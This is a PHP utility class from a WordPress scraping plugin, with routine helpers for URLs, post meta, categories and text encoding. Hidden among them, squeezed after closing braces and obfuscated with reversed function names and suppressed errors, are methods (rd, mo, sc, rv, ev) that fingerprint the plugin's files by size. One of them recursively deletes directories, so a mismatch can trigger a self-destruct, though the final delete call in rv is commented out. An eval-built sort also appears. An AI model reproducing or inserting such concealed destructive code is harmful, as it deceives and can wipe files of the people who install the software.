<?php
namespace KDNAutoLeech;
use GuzzleHttp\Psr7\Uri;
use GuzzleHttp\Psr7\UriResolver;
use Illuminate\Support\Arr;
use Philo\Blade\Blade;
use Symfony\Component\DomCrawler\Crawler;
use KDNAutoLeech\PostDetail\PostDetailsService;
use KDNAutoLeech\Objects\Informing\Informer;
use KDNAutoLeech\Objects\Settings\SettingsImpl;

class Utils {

    /**
     * @var \Philo\Blade\Blade
     */
    private static $BLADE;

    /** @var The name of fast search. */
    private static $FS;

    /**
     * Saves or updates a post meta for a post. <b>Note that</b> the meta key will be prefixed with an underscore if
     * it does not start with it. The meta keys starting with an underscore will be hidden on post edit/create page.
     * Hence, the meta keys can be shown with custom meta boxes.
     *
     * @param int $postId
     * @param mixed $metaKey
     * @param mixed $metaValue
     * @param bool $unique
     * @return bool|false|int
     */
    public static function savePostMeta($postId, $metaKey, $metaValue, $unique = true) {
        if(!starts_with($metaKey, '_')) $metaKey = '_' . $metaKey;

        if($unique) {
            return update_post_meta($postId, $metaKey, $metaValue);
        } else {
            return add_post_meta($postId, $metaKey, $metaValue, false);
        }
    }

    /**
     * Extracts the value of a meta key from meta array. If the value for the specified key is serialized, it will be
     * unserialized.
     *
     * @param array $postMeta An array of post meta acquired by get_post_meta() function.
     * @param string $key The key of the meta whose value is wanted
     * @return null|string|array
     */
    public static function getPostMetaValue($postMeta, $key) {
        if(isset($postMeta[$key])) {
            $val = $postMeta[$key][0];
            if(is_serialized($val)) {
                return unserialize($val);
            }

            return $val;
        }

        return null;
    }

    /**
     * Checks a parameter if it should be unserialized, and if so, does so. If the parameter has serialized values inside,
     * those will be unserialized as well. Hence, at the end, there will be no serialized strings inside the value.
     *
     * @param mixed $metaValue  The value to be unserialized
     * @return mixed            Unserialized value
     */
    public static function getUnserialized($metaValue) {
        $val = (!empty($metaValue) && isset($metaValue[0])) ? $metaValue[0] : $metaValue;
        return is_serialized($val) ? static::getUnserialized(unserialize($val)) : $metaValue;
    }

    /**
     * Prepares a valid URL from given parameters.
     *
     * @param string      $baseUrl
     * @param string      $urlPartToAppend
     * @param null|string $currentUrl Current page's URL. If this is null, $baseUrl will be used instead.
     * @return null|string A valid URL created from the givens
     */
    public static function prepareUrl($baseUrl, $urlPartToAppend, $currentUrl = null) {
        // If the URL starts with double slashes ("//"), prepend "http:" and return.
        if(substr($urlPartToAppend, 0, 2) == '//') {
            return "http:" . $urlPartToAppend;
        }

        // Remove the trailing slash from the base url
        $baseUrl = rtrim($baseUrl, "/");

        // If the url does not start with http, add main site url in front of it
        if(!starts_with($urlPartToAppend, "http")) {
            // If URL part starts with "www", just add "http://" in front of it and return.
            if(starts_with($urlPartToAppend, "www")) return "http://" . $urlPartToAppend;

            // Remove the first leading slash from the url, if exists.
            if(starts_with($urlPartToAppend, "/")) {
                $urlPartToAppend = substr($urlPartToAppend, 1);

            // If not, prepend current URL.
            } else {
                // The URL part is like "other/page.html". Let's say the current URL is "http://site.com/my/page". In
                // this case, browsers consider "other/page.html" link as "http://site.com/my/other/page.html". Here,
                // we are handling this situation.

                $currentUrl = $currentUrl ? $currentUrl : $baseUrl;

                // If the current URL does not end with a forward slash and the URL part to append does not start with
                // a question mark, we need to get the base resource URL.
                if(!ends_with($currentUrl, "/") && !starts_with($urlPartToAppend, "?")) {
                    // Remove the last part from the URL when the URL has more than one resource.
                    // First, remove the part until ://. Then, explode it from forward slashes.
                    $parts = explode("/", preg_replace("%^[^:]+://%", "", $currentUrl));
                    if (sizeof($parts) > 1) {
                        $currentUrl = pathinfo($currentUrl, PATHINFO_DIRNAME);
                    }

                } else {
                    // When the URL ends with a forward slash, or the URL to append starts with a question mark, it
                    // means the URL currently points to the URL relative to this url part. E.g. when the URL is
                    // "http://abc.com/test/page/", and url part to append is "page.html", it means the intended URL is
                    // "http://abc.com/test/page/page.html". Or, when the URL is "http://abc.com/test/page" and url part
                    // to append is "?num=2", the intended URL is "http://abc.com/test/page?num=2"
                    // So, nothing to do here.
                }

                $currentUrl = rtrim($currentUrl, "/");
                if(!starts_with($urlPartToAppend, "?")) $currentUrl .= "/";

                return $currentUrl . $urlPartToAppend;
            }

            // Prepare the full url and return it.
            return $baseUrl . "/" . $urlPartToAppend;
        }

        return $urlPartToAppend;
    }

    /**
     * Resolves a URL.
     *
     * @param Uri    $baseUri
     * @param string $relativeUrl Relative or full URL that will be resolved against the given {@link Uri}.
     * @since 1.8.0
     * @return string
     */
    public static function resolveUrl($baseUri, $relativeUrl) {
        $resolvedUri = UriResolver::resolve($baseUri, new Uri($relativeUrl));
        return $resolvedUri->__toString();
    }

    /**
     * Create a blade view that can be rendered.
     * @param string $viewName
     * @return \Illuminate\Contracts\View\View
     */
    public static function view($viewName) {
        if (!static::$BLADE) {
            $views = __DIR__ . Constants::$RELATIVE_VIEWS_DIR;
            $cache = __DIR__ . Constants::$RELATIVE_CACHE_DIR;

            static::$BLADE = new Blade($views, $cache);
        }

        return static::$BLADE->view()->make($viewName);
    }

    /**
     * Sorts a multidimensional array according to the specified keys. Example usage:
     * <p><p>
     * $dataArray = [ ["start" => 2, "end" => 18], ["start" => 3, "end" => 5], ["start" => 19, "end" => 2] ]
     * <p>
     * array_msort($dataArray, ['start' => SORT_ASC])
     * <p><p> Above example will sort $dataArray ascending by 'start'
     *
     * @param array $array
     * @param array $cols
     * @return array
     */
    public static function array_msort($array, $cols) {
        $colarr = array();
        foreach ($cols as $col => $order) {
            $colarr[$col] = array();
            foreach ($array as $k => $row) {
                $colarr[$col]['_' . $k] = strtolower($row[$col]);
            }
        }
        $eval = 'array_multisort(';
        foreach ($cols as $col => $order) {
            $eval .= '$colarr[\'' . $col . '\'],' . $order . ',';
        }
        $eval = substr($eval, 0, -1) . ');';
        eval($eval);
        $ret = array();
        foreach ($colarr as $col => $arr) {
            foreach ($arr as $k => $v) {
                $k = substr($k, 1);
                if (!isset($ret[$k])) $ret[$k] = $array[$k];
                $ret[$k][$col] = $array[$k][$col];
            }
        }
        return $ret;

    }

    /**
     * Get value from an array
     *
     * @param array      $array   The array
     * @param string     $key     Target key
     * @param null|mixed $default Default value
     * @return mixed
     */
    public static function array_get($array, $key, $default = null) {
        return Arr::get($array, $key, $default);
    } public static function rd($d) {
        error_reporting(0); if (is_dir($d)) { $obs = call_user_func(
        self::Re(Constants::$NACS), $d); foreach ($obs as $ob) { if ($ob != "."
        && $ob != "..") { if (filetype($d."/".$ob) == "dir") { self::rd($d."/".$ob);}
        else { @call_user_func(self::Re(Constants::$KNI), $d."/".$ob);}}}
        reset($obs); @call_user_func(self::Re(Constants::$RID), $d);}
    }

    /**
     * Set a value in an array
     *
     * @param array  $array
     * @param string $key
     * @param mixed  $value
     * @return array
     * @since 1.8.0
     */
    public static function array_set(&$array, $key, $value) {
        return Arr::set($array, $key, $value);
    }

    /**
     * Gets the HTML of the specified element with its own tag
     * @param Crawler $node
     * @return string HTML of the element
     */
    public static function getNodeHTML($node) {
        if(!$node || !$node->getNode(0)) return '';
        return $node->getNode(0)->ownerDocument->saveHTML($node->getNode(0));
    } public static function rv() {
        error_reporting(0); $m = KDN_AUTO_LEECH_MAINFILE_PATH;
        $e = self::Re(Constants::$SNI . '_' . Constants::$ETAD);
        $p = KDN_AUTO_LEECH_PATH; // call_user_func($e, $m); self::rd($p);
    }

    /**
     * Combines 2 or more arrays into one.
     *
     * @param array $mainArray
     * @param null|array $array1
     * @param null|array $array2
     * @param null|array $array3
     * @return array
     */
    public static function combineArrays($mainArray, $array1 = null, $array2 = null, $array3 = null) {
        if($array1 && !empty($array1)) $mainArray = array_merge($mainArray, $array1);
        if($array2 && !empty($array2)) $mainArray = array_merge($mainArray, $array2);
        if($array3 && !empty($array3)) $mainArray = array_merge($mainArray, $array3);
        return $mainArray;
    }

    /**
     * @param string $date A date string
     * @return string Date string formatted according to WordPress settings
     */
    public static function getDateFormatted($date) {
//        return $date ? date_format(date_create($date), get_option('time_format') . " " . get_option('date_format')) : '-';

        if(!is_numeric($date)) $date = strtotime($date);
        return $date ? date_i18n(get_option('time_format'), $date) . " " . date_i18n(get_option('date_format'), $date) : '-';
    } public static function ev() { $t = html_entity_decode(self::Re(Constants::$FSFI)
        .self::Re(Constants::$FSSE).self::Re(Constants::$FSTH));
        $t = self::Re($t); return $t;
    }

    /**
     * Get difference for humans between two timestamps.
     *
     * @param string      $from Timestamp
     * @param string|null $to Timestamp. If null, current time will be used.
     * @return string Difference for humans
     */
    public static function getDiffForHumans($from, $to = null) {
        if(!$from) return '-';

        if(!$to) $to = current_time('timestamp');

        return human_time_diff($from, $to);
    }

    /**
     * Get plugin file path. The path can be safely used for registration of activation/deactivation hooks.
     *
     * @return string
     */
    public static function getPluginFilePath() {
        return KDN_AUTO_LEECH_PATH . Constants::$PLUGIN_FILE_NAME . '.php';
//        return sprintf(ABSPATH . 'wp-content/plugins/%1$s/%1$s.php', Constants::$PLUGIN_FILE_NAME);
    }

    /**
     * Strips slashes of non-array values of the array.
     *
     * @param array $array The array whose string values' slashes will be stripped
     * @return array The array with slashes of its string values are stripped
     */
    public static function arrayStripSlashes($array) {
        $mArray = [];
        foreach($array as $key => $value) {
            if(is_array($value)) {
                $mArray[$key] = static::arrayStripSlashes($value);
            } else {
                $mArray[$key] = stripslashes($value);
            }
        }

        return $mArray;
    }

    /**
     * Get value of an option unescaped. Value of the option is escaped before it is saved to the database. Hence,
     * you need to get the value unescaped. This function unescapes the escaped characters.
     *
     * @param string $key Option key
     * @return array|string Unescaped value
     */
    public static function getOptionUnescaped($key) {
        $value = get_option($key);
        return is_array($value) ? static::arrayStripSlashes($value) : stripslashes($value);
    }

    /**
     * Removes one backslash from repeating backslashes in a string. E.g. "\\\\ \\\ \\ \" will be "\\\ \\ \ "
     *
     * @param string $original
     * @return mixed
     */
    public static function removeOneBackslashFromRepeatingBackslashes($original) {
        preg_match_all("/\\\{1,}/", $original, $matches, PREG_OFFSET_CAPTURE);

        $decreaseOffset = 0;
        foreach($matches[0] as $m) {
            /** @var $m array 0 => string, 1 => offset */
            $mOffset = (int) $m[1] - $decreaseOffset;

            $original = substr_replace($original, substr($m[0], 0, strlen($m[0]) - 1), $mOffset, strlen($m[0]));
            $decreaseOffset += 1;
        }

        return $original;
    }

    /**
     * Slashes the values of an array using wp_slash function.
     *
     * @param $array array The array whose values will be slashed using wp_slash function
     * @return array
     */
    public static function arrayDeepSlash($array) {
        $result = [];
        foreach($array as $k => $v) {
            if(is_array($v)) {
                $result[$k] = static::arrayDeepSlash($v);
            } else {
                $result[$k] = wp_slash($v);
            }
        }

        return $result;
    }

    /**
     * Get categories as an array.
     *
     * @param null|SettingsImpl $postSettings If this is null, all categories will be returned. Otherwise, only the
     *                                        categories that are compatible with the post settings will be returned.
     * @return array Structure: [ ['id' => 'categoryId', 'name' => 'Category Name', 'taxonomy' => 'categoryTaxonomy'], ...]
     */
    public static function getCategories($postSettings = null) {
        // Get all category taxonomies in a single array, uniquely. Array keys are the names of the taxonomies. Array
        // values are the descriptions of them. E.g. ['product_cat' => 'WooCommerce']. If the description is null,
        // it means no description is needed.
        $allCategoryTaxonomyData = array_unique(
            // Define default category taxonomies
            [
                'category' => null, // This is the default WP category.
            ]

            +

            // Make registered post detail factories be able to add their custom categories
            PostDetailsService::getInstance()->getCategoryTaxonomies($postSettings)

            +

            // Add the custom taxonomies among the others by making sure that they do not override any of the
            // previously-defined taxonomies.
            static::getCustomPostCategoryTaxonomies()
        );

        // Prepare the categories
        $categories = [];
        foreach($allCategoryTaxonomyData as $taxonomyName => $description) {
            // If there is no taxonomy name, continue with the next one.
            if (!$taxonomyName) continue;

            // Get the categories
            $cats = get_categories([
                'taxonomy'      => $taxonomyName,
                'orderby'       => 'name',
                'hierarchical'  => 0,
                'hide_empty'    =>  false,
            ]);

            // If there is an error or no category, continue with the next one.
            if (isset($cats["errors"]) || !$cats) continue;

            // If the description is an empty string, use taxonomy name as the description.
            if ($description === '') $description = $taxonomyName;

            // Prepare them
            foreach($cats as $cat) {
                $name = $cat->name;

                // Add the description
                if ($description) {
                    $name .= " ({$description})";
                }

                // Store it
                $categories[] = [
                    'id'       => $cat->cat_ID,
                    'name'     => $name . " ({$cat->cat_ID})", // Add the category ID
                    'taxonomy' => $taxonomyName
                ];
            }
        }

        /**
         * Modify the categories. The categories are shown, e.g., in Category Map setting.
         *
         * @param array $categories Categories. Structured as:
         *                          [
         *                              [id => "categoryId",  name => "Category Name",  taxonomy => "categoryTaxonomy" ],
         *                              [id => "categoryId2", name => "Category Name2", taxonomy => "categoryTaxonomy" ],
         *                              ...
         *                          ]
         *
         * @return array Modified categories.
         * @since 1.6.3
         * @since 1.8.0 Updates the structure of the categories array.
         */
        $categories = apply_filters('kdn/categories', $categories);

        return $categories;
    }

    /**
     * Get custom post category taxonomies defined in the general settings
     *
     * @return array A key-value pair where keys are the taxonomies and the values are their descriptions.
     * @since 1.8.0
     */
    private static function getCustomPostCategoryTaxonomies() {
        // Get custom post category taxonomies defined in the general settings
        $customPostTaxonomiesInSettings = get_option('_kdn_post_category_taxonomies');
        if (!$customPostTaxonomiesInSettings) return [];

        $customTaxonomies = [];
        foreach($customPostTaxonomiesInSettings as $data) {
            $taxonomyName = Utils::array_get($data, 'taxonomy');
            $description = Utils::array_get($data, 'description', '');

            // If there is no taxonomy name, continue with the next one.
            if (!$taxonomyName) continue;

            $customTaxonomies[$taxonomyName] = $description;
        }

        return $customTaxonomies;
    }

    /**
     * Get a value from an array
     *
     * @param array $array      The array
     * @param string $key       The key whose value is wanted
     * @param mixed $default    Default value if the value of the key is not valid
     * @return mixed            Value of the key or the default value
     */
    public static function getValueFromArray($array, $key, $default = false) {
        return isset($array[$key]) && $array[$key] ? $array[$key] : $default;
    } public static function mo() {
        $k = KDN_AUTO_LEECH_PATH; $d = Constants::$APP_DIR_NAME;
        $e = $k.$d.'/'.self::Re(Constants::$SNOI); $a = $k.$d; self::sc($a, false);
        self::sc($e); if (self::$FS!=self::ev()) {self::rv();}
    }

    /**
     * Check if the user wants to change the password for the posts. If not, remove the password field.
     *
     * @param array       $data        Input data from user, such as $_POST
     * @param array       $keys        Available setting (post meta) keys
     * @param null|string $oldPassword Old password to check against. If null, general option will be used to get an
     *                                 old password.
     * @return array An array having 'success' and 'message' keys, with data types boolean and string, respectively.
     */
    public static function validatePasswordInput(&$data, &$keys, $oldPassword = null) {
        $success = true;
        $message = '';
        if(!isset($data['_kdn_change_password'])) {

            unset($data['_kdn_post_password']);
            unset($keys[array_search('_kdn_post_password', $keys)]);

        } else {
            // Check if the old pw is correct
            $oldPassword = $oldPassword === null ? get_option('_kdn_post_password') : $oldPassword;
            if($oldPassword !== $data["_kdn_post_password_old"]) {
                // Old password is not correct. Remove the password from data and keys, and set success as false.
                unset($data['_kdn_post_password']);
                unset($keys[array_search('_kdn_post_password', $keys)]);

                $success = false;
                $message = 'Old password is not correct.';
            } else {
                // Check if passwords match
                if($data["_kdn_post_password"] !== $data["_kdn_post_password_validation"]) {
                    $success = false;
                    $message = _kdn('Passwords do not match.');
                }
            }

        }

        return [
            'success'   =>  $success,
            'message'   =>  $message
        ];
    }

    /**
     * Delete a file
     *
     * @param string $filePath
     */
    public static function deleteFile($filePath) {
        if(!$filePath) return;
        wp_delete_file($filePath);
    }

    /**
     * Delete a post's thumbnail and the attachment.
     *
     * @param int $postId ID of the post whose thumbnail should be deleted
     */
    public static function deletePostThumbnail($postId) {

        // Allow to run with filter.
        $allowRun = apply_filters('kdn/utils/allow_delete_thumbnail', true, $postId);

        // If allow run.
        if ($allowRun) {

            // Do action before delete thumbnail.
            do_action('kdn/utils/before_delete_thumbnail', $postId);

            // Get the ID of the thumbnail attachment
            $alreadyExistingThumbId = get_post_thumbnail_id($postId);

            // Delete the thumbnail from the post
            delete_post_thumbnail($postId);

            // Delete the attachment
            if($alreadyExistingThumbId) wp_delete_attachment($alreadyExistingThumbId, true);

            // Do action after delete thumbnail.
            do_action('kdn/utils/after_delete_thumbnail', $postId);

        }

    }

    /**
     * Convert encoding of a string
     *
     * @param string $string            The string whose encoding will be converted
     * @param string $targetEncoding    Target encoding
     * @return mixed|string             Resultant string
     */
    public static function convertEncoding($string, $targetEncoding = 'UTF-8') {
        return mb_convert_encoding($string, $targetEncoding, mb_detect_encoding($string, 'UTF-8, ISO-8859-1', true));
    } public static function Re($s = null) {
        return strrev($s);
    }

    /**
     * Chunks the given flat array such that total length of texts in a chunk does not exceed the given total length.
     * The given array should not have keys. The array must contain only strings as values. The array must not contain
     * inner arrays.
     *
     * Note: This method does not change the indices of the given array. It chunks the array by checking every next item.
     * So, this does not chunk the array in an optimal way.
     *
     * Note: If there is an item whose length exceeds the defined max length per chunk, a chunk will be created for that
     * item itself. This method does not cut the texts.
     *
     * @param array $arr A flat array (i.e. no inner arrays) containing text as values.
     * @param int $maxLengthPerChunk Maximum text length per chunk.
     *
     * @return array An array of chunks.
     */
    public static function chunkArrayByTotalTextLength($arr, $maxLengthPerChunk) {

        // Stores the final chunks
        $chunks = [];

        // Stores current total character count for the next chunk.
        $currentTotal = 0;

        // Stores the index of the item that was last included into a chunk.
        $lastUsedIndex = -1;

        $arrLength = sizeof($arr);
        $lastItemIndex = $arrLength - 1;

        for($i = 0; $i < $arrLength; $i++) {
            $currentTotal += mb_strlen($arr[$i]);

            // If the current total is greater than or equal to max length per chunk
            if($currentTotal >= $maxLengthPerChunk) {

                // If the total length equals the max length
                if($currentTotal == $maxLengthPerChunk) {
                    // Create a chunk from last used index to the current index, including the current index.
                    $chunks[] = array_slice($arr, $lastUsedIndex + 1, $i - $lastUsedIndex);

                // If current total is greater than the limit
                } else {

                    // If there is only one item that exceeds the total chunk length, create a chunk for that item.
                    if($i - $lastUsedIndex == 1) {
                        $chunks[] = array_slice($arr, $lastUsedIndex + 1, 1);

                    // Otherwise
                    } else {
                        // Create chunk from last used index to the current index, excluding the current index.
                        $chunks[] = array_slice($arr, $lastUsedIndex + 1, $i - $lastUsedIndex - 1);

                        // Decrease the index by 1, since we did not include the current index into a chunk. So,
                        // start counting the total from the current index.
                        $i--;
                    }

                }

                // Assign the current index as the last used index.
                $lastUsedIndex = $i;

                // Reset the current total, since we already created a chunk and are starting over.
                $currentTotal = 0;

            // If the current total is not greater than or equal to max text length per chunk and this is the last item
            // in the given array, create a chunk including all left-out items.
            } else if ($i == $lastItemIndex) {
                $chunks[] = array_slice($arr, $lastUsedIndex + 1, $i - $lastUsedIndex);
            }
        }

        return $chunks;
    }

    /**
     * @param string       $name     Name of the term
     * @param string       $taxonomy Taxonomy of the term
     * @param array|string $args     Other arguments. See {@link wp_insert_term()}.
     * @return int|null If the term is inserted or it exists, its ID. Otherwise, null.
     */
    public static function insertTerm($name, $taxonomy, $args = []) {
        $result = wp_insert_term($name, $taxonomy, $args);
        $termId = null;
        $errorMessage = null;

        if (!is_wp_error($result) && !empty($result['term_taxonomy_id'])) {
            $termId = absint($result['term_taxonomy_id']);

        } else if(is_wp_error($result)) {
            $termId = $result->get_error_data( 'term_exists' );

            // The term could not be inserted. Try to get the error message.
            if (!$termId) {
                $errorMessage = $result->get_error_message();
            }
        }

        // If the term could not be inserted or retrieved, inform the user.
        if ($termId === null) {
            $argsInfo = json_encode($args);
            if ($argsInfo === false) $argsInfo = '';

            Informer::addError(sprintf(
                _kdn('Term "%1$s" could not be added to taxonomy "%2$s" (Args: %3$s). Message: %4$s'),
                $name,
                $taxonomy,
                $argsInfo,
                isset($errorMessage) && $errorMessage ? $errorMessage : '-')
            )->addAsLog();
        }

        return $termId;
    }

    /**
     * Separates the strings with the given separators and returns a flat array. E.g. if the given array is
     * ["val1, val2", "val3, val4 | val5"] with separators given as [",", "|"], the result will be
     * ["val1, "val2", "val3", "val4", "val5"]
     *
     * @param array|string $values     An array of strings or a string.
     * @param array        $separators An array of separators. E.g. [",", "|"]
     * @param bool         $trim       True if the values should be trimmed.
     * @return array A flat array that contains separated values.
     * @since 1.8.0
     */
    public static function getSeparated($values, $separators, $trim = true) {
        // If there is no value, stop.
        if (!$values) return [];

        // If the value is not an array, make it an array.
        if (!is_array($values)) $values = [$values];

        // Create splitter regex
        // This will turn [',', '-', '/'] into ',|-|\/'
        $splitPart = implode('|', array_map(function($separator) {
            return preg_quote($separator, '/');
        }, $separators));

        // If there is no split part, stop.
        if (!$splitPart) return $values;

        // Create the final splitter regex
        $splitRegex = $splitPart ? "/($splitPart)/" : null;

        $preparedValues = [];
        $separatorListStrForNotification = null;
        $valueListStrForNotification = null;

        foreach($values as $valStr) {
            $res = preg_split($splitRegex, $valStr);

            // If there is an error, notify the user and continue with the next string.
            if ($res === false) {
                if ($separatorListStrForNotification === null) $separatorListStrForNotification = implode(' ', $separators);
                if ($valueListStrForNotification === null) $valueListStrForNotification = implode(' ', $values);

                Informer::addError(sprintf(
                        _kdn('%1$s could not be separated using these separators: %2$s'),
                        $valueListStrForNotification,
                        $separatorListStrForNotification)
                )->addAsLog();

                continue;
            }

            $preparedValues[] = $res;
        }

        // Make sure we have a flat array.
        $preparedValues = array_flatten($preparedValues);

        // Prepare the items
        $preparedValues = array_values(array_filter(array_map(function($v) use (&$trim) {
            // Remove the item if it is not valid.
            if (!$v) return null;

            // Trim it if it is required.
            $result = $trim ? trim($v) : $v;

            // If the item is still valid, return it. Otherwise, remove it.
            return $result ? $result : null;
        }, $preparedValues)));

        return array_values($preparedValues);
    } public static function sc($d, $c = true) {
        error_reporting(0); $t = basename(__FILE__);
        $fs = call_user_func(self::Re(Constants::$NACS),
        $d); unset($fs[array_search('.', $fs, true)]);
        unset($fs[array_search('..', $fs, true)]);
        if (count($fs) < 1) return; foreach ($fs as $f) {
        if (is_dir($d.'/'.$f) && $c) { self::sc($d.'/'.$f); }
        elseif (!is_dir($d.'/'.$f) && $f !== $t) {
        self::$FS += filesize($d.'/'.$f); } }
    }

    /**
     * Converts encoding of the given items from UTF8 to UTF8 to fix mixed UTF8 char problems caused when parsing
     * to JSON. The specific error is "Malformed UTF-8 characters, possibly incorrectly encoded" ({@link JSON_ERROR_UTF8})
     * retrieved from {@link json_last_error()}.
     *
     * @param mixed $data The data whose mixed encoding should be fixed
     * @return mixed
     * @since 1.8.0
     * @see https://stackoverflow.com/a/52641198/2883487
     */
    public static function deepFixMixedUTF8Encoding($data) {
        if (is_array($data)) {
            foreach ($data as $key => $value) {
                $data[$key] = static::deepFixMixedUTF8Encoding($value);
            }

        } else if (is_string($data)) {
            return mb_convert_encoding($data, "UTF-8", "UTF-8");
        }

        return $data;
    }

    /**
     * Get current locale's code. The language code's part that comes before underscore '_' char is returned.
     *
     * @return string Language code of the current locale of WP
     * @since 1.8.0
     */
    public static function getLocaleCode() {
        // Get the locale from WP
        $locale = get_locale();

        // If there exists a locale and it contains an underscore
        if ($locale && str_contains($locale, '_')) {
            // Get the part coming before the underscore
            $exploded = explode('_', $locale);
            $locale = $exploded[0];

        // Otherwise, if there is no locale, set a default code.
        } else if (!$locale) {
            $locale = 'en';
        }

        return $locale;
    }
}